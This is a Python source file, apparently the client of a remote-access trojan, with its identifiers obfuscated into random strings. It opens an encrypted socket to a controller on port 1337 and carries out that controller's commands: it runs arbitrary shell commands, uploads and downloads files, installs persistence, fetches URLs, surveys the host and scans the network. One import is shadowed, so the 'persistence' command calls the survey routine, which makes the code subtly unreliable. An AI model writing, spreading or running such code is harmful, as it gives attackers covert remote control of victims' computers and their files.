#!/usr/bin/env python
# -*- coding: utf-8 -*-
import socket
import subprocess
import struct
import sys
try:
    from core.crypto import vTYSKuIhNxlSaaGMqczXnvvdSEyfcCaz, jPZzsDfeiZRgNjrNBIlaUBIRWcGSUACw, uwOextuKbEVHwkbZiYiWAZaRnSRCOKoA
    from core.filesock import yjQlCEghfMxsJwdmoDLBqnesZhMFoTtH, LsEvOAVQPRUrrNvbBUQcKlyeWdlSoWyi
    from core.persistence import KkcYsizBHBQwCUpnRgwrYYAAnXOReEQQ
    from core.scan import rIWDlLvwQJNduZJsdPwSVIUMRBxTNank
    from core.survey import KkcYsizBHBQwCUpnRgwrYYAAnXOReEQQ
    from core.toolkit import IqKsJvdgDmUmoQnjYBwqdobWQbQIsuSB, YqJAJWVCKIQnzKVFYIFbwvGyLEHkdSzJ
except ImportError as avNHPTznqFYhEoRsxGTYMYACxLmbcQJs:
    print(avNHPTznqFYhEoRsxGTYMYACxLmbcQJs)
    sys.exit(0)
NMcHFwTpAqqciBcKkKPwuqPDnPVvnpiz = sys.platform
eaihQtAyilmwgjbIDCJGOBbdEhCsdgFO      = 'localhost'
PYlozZmwOuTweSCzfSxjoLsvKsfUtgWj      = 1337
EakFFYQngODCjVemerDhJGXIsiLIuWyb    = 'b14ce95fa4c33ac2803782d18341869f'
def IdarYTtwTCMUuBxkRmpKcsCdGsSVgaFX():
    GmwXZdrnoUbldKqssCIqWIqANfnQaEIj = socket.socket()
    GmwXZdrnoUbldKqssCIqWIqANfnQaEIj.connect((eaihQtAyilmwgjbIDCJGOBbdEhCsdgFO, PYlozZmwOuTweSCzfSxjoLsvKsfUtgWj))
    mOwFAIMjnvpITALRtKohzxocgBwtHBNM = uwOextuKbEVHwkbZiYiWAZaRnSRCOKoA(GmwXZdrnoUbldKqssCIqWIqANfnQaEIj)
    while True:
        GkhcTLcKpgtGdZnRyrrRGfRUdvxHZutH = GmwXZdrnoUbldKqssCIqWIqANfnQaEIj.recv(1024)
        GkhcTLcKpgtGdZnRyrrRGfRUdvxHZutH = vTYSKuIhNxlSaaGMqczXnvvdSEyfcCaz(GkhcTLcKpgtGdZnRyrrRGfRUdvxHZutH, mOwFAIMjnvpITALRtKohzxocgBwtHBNM)
        wERuTKBOCPCahvPuqrVtuEthDpuhYngL, _, action = GkhcTLcKpgtGdZnRyrrRGfRUdvxHZutH.partition(' ')
        if wERuTKBOCPCahvPuqrVtuEthDpuhYngL == 'quit':
            GmwXZdrnoUbldKqssCIqWIqANfnQaEIj.close()
            sys.exit(0)
        elif wERuTKBOCPCahvPuqrVtuEthDpuhYngL == 'run':
            gJOTYGTIGJHruoBpOejTvOJsMiZzYjrm = subprocess.Popen(action, shell=True,
                      stdout=subprocess.PIPE, stderr=subprocess.PIPE,
                      stdin=subprocess.PIPE)
            gJOTYGTIGJHruoBpOejTvOJsMiZzYjrm = gJOTYGTIGJHruoBpOejTvOJsMiZzYjrm.stdout.read() + gJOTYGTIGJHruoBpOejTvOJsMiZzYjrm.stderr.read()
            GmwXZdrnoUbldKqssCIqWIqANfnQaEIj.sendall(jPZzsDfeiZRgNjrNBIlaUBIRWcGSUACw(gJOTYGTIGJHruoBpOejTvOJsMiZzYjrm, mOwFAIMjnvpITALRtKohzxocgBwtHBNM))
        elif wERuTKBOCPCahvPuqrVtuEthDpuhYngL == 'download':
            for FncUDhpNFnbFvciPnXtmEumcvADoZbpd in action.split():
                FncUDhpNFnbFvciPnXtmEumcvADoZbpd = FncUDhpNFnbFvciPnXtmEumcvADoZbpd.strip()
                LsEvOAVQPRUrrNvbBUQcKlyeWdlSoWyi(GmwXZdrnoUbldKqssCIqWIqANfnQaEIj, FncUDhpNFnbFvciPnXtmEumcvADoZbpd, mOwFAIMjnvpITALRtKohzxocgBwtHBNM)
        elif wERuTKBOCPCahvPuqrVtuEthDpuhYngL == 'upload':
            for FncUDhpNFnbFvciPnXtmEumcvADoZbpd in action.split():
                FncUDhpNFnbFvciPnXtmEumcvADoZbpd = FncUDhpNFnbFvciPnXtmEumcvADoZbpd.strip()
                yjQlCEghfMxsJwdmoDLBqnesZhMFoTtH(GmwXZdrnoUbldKqssCIqWIqANfnQaEIj, FncUDhpNFnbFvciPnXtmEumcvADoZbpd, mOwFAIMjnvpITALRtKohzxocgBwtHBNM)
        elif wERuTKBOCPCahvPuqrVtuEthDpuhYngL == 'rekey':
            mOwFAIMjnvpITALRtKohzxocgBwtHBNM = uwOextuKbEVHwkbZiYiWAZaRnSRCOKoA(GmwXZdrnoUbldKqssCIqWIqANfnQaEIj)
        elif wERuTKBOCPCahvPuqrVtuEthDpuhYngL == 'persistence':
            gJOTYGTIGJHruoBpOejTvOJsMiZzYjrm = KkcYsizBHBQwCUpnRgwrYYAAnXOReEQQ(NMcHFwTpAqqciBcKkKPwuqPDnPVvnpiz)
            GmwXZdrnoUbldKqssCIqWIqANfnQaEIj.send(jPZzsDfeiZRgNjrNBIlaUBIRWcGSUACw(gJOTYGTIGJHruoBpOejTvOJsMiZzYjrm, mOwFAIMjnvpITALRtKohzxocgBwtHBNM))
        elif wERuTKBOCPCahvPuqrVtuEthDpuhYngL == 'wget':
            gJOTYGTIGJHruoBpOejTvOJsMiZzYjrm = IqKsJvdgDmUmoQnjYBwqdobWQbQIsuSB(action)
            GmwXZdrnoUbldKqssCIqWIqANfnQaEIj.send(jPZzsDfeiZRgNjrNBIlaUBIRWcGSUACw(gJOTYGTIGJHruoBpOejTvOJsMiZzYjrm, mOwFAIMjnvpITALRtKohzxocgBwtHBNM))
        elif wERuTKBOCPCahvPuqrVtuEthDpuhYngL == 'unzip':
            gJOTYGTIGJHruoBpOejTvOJsMiZzYjrm = YqJAJWVCKIQnzKVFYIFbwvGyLEHkdSzJ(action)
            GmwXZdrnoUbldKqssCIqWIqANfnQaEIj.send(jPZzsDfeiZRgNjrNBIlaUBIRWcGSUACw(gJOTYGTIGJHruoBpOejTvOJsMiZzYjrm, mOwFAIMjnvpITALRtKohzxocgBwtHBNM))
        elif wERuTKBOCPCahvPuqrVtuEthDpuhYngL == 'survey':
            gJOTYGTIGJHruoBpOejTvOJsMiZzYjrm = KkcYsizBHBQwCUpnRgwrYYAAnXOReEQQ(NMcHFwTpAqqciBcKkKPwuqPDnPVvnpiz)
            GmwXZdrnoUbldKqssCIqWIqANfnQaEIj.send(jPZzsDfeiZRgNjrNBIlaUBIRWcGSUACw(gJOTYGTIGJHruoBpOejTvOJsMiZzYjrm, mOwFAIMjnvpITALRtKohzxocgBwtHBNM))
        elif wERuTKBOCPCahvPuqrVtuEthDpuhYngL == 'scan':
            gJOTYGTIGJHruoBpOejTvOJsMiZzYjrm = rIWDlLvwQJNduZJsdPwSVIUMRBxTNank(action)
            GmwXZdrnoUbldKqssCIqWIqANfnQaEIj.send(jPZzsDfeiZRgNjrNBIlaUBIRWcGSUACw(gJOTYGTIGJHruoBpOejTvOJsMiZzYjrm, mOwFAIMjnvpITALRtKohzxocgBwtHBNM))
if __name__ == '__main__':
    IdarYTtwTCMUuBxkRmpKcsCdGsSVgaFX()
